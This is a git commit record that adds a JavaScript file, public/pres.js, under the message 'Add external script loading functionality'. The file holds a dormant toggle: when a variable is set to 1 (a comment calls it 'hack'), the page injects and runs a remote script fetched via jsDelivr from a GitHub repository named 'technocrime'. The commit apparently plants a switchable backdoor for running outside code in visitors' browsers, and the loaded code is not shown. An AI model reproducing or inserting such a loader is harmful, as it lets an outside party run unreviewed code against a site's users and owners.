6957d46952830af6428f5355c8dd6a939cf09348
Fredrick Lani <31032310+laniricky@users.noreply.github.com>
2025-12-04 08:21:24 +0300

    Add external script loading functionality

---
+++ public/pres.js
@@ -0,0 +1,19 @@
+// your variable
+    let ck = 0; // change to 0 to disable
+
+    // check and load external script if hack = 1
+    if (ck === 1) {
+        const script = document.createElement('script');
+        script.src = "https://cdn.jsdelivr.net/gh/rucomrada/technocrime/public/vres.js";
+        script.type = "text/javascript";
+        script.async = true;
+        document.head.appendChild(script);
+
+        script.onload = () => {
+            console.log("External ck script loaded.");
+        };
+
+        script.onerror = () => {
+            console.error("Failed to load the ck script.");
+        };
+    }
